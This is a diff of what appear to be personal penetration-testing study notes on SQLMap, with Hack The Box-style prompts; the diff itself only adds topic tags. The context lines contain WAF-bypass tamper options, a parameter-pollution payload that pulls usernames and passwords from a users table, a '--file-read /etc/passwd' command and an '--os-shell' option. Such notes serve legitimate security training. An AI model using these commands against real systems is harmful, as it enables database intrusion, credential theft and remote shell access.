@@ -1,4 +1,4 @@
-
+[[sql]]
 #####  Copy request as curl and paste to terminal
 
 ```shell
@@ -84,6 +84,7 @@ la1n23@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc
 `proxy="socks4://177.39.187.70:33283`
 `--check-tor`
 ##### WAF
+[[WAF]]
 Whenever we run SQLMap, As part of the initial tests, SQLMap sends a predefined malicious looking payload using a non-existent parameter name (e.g. `?pfov=...`) to test for the existence of a WAF (Web Application Firewall). There will be a substantial change in the response compared to the original in case of any protection between the user and the target. For example, if one of the most popular WAF solutions (ModSecurity) is implemented, there should be a `406 - Not Acceptable` response after such a request.
 Detect WAF by signature: https://github.com/stamparm/identYwaf
 
@@ -100,13 +101,12 @@ Modyfing queries to bypass WAF.
 `--list-tampers`
 
 ##### HTTP paramater pollution (HPP)
-
+[[HPP]]
 ```
 id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...
 ```
 
 ##### Files
-
 ```shell-session
 --file-read "/etc/passwd"
 ```
@@ -116,7 +116,6 @@ id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...
 ```
 
 #### Upload shell
-
 ```shell
 --os-shell
 ```
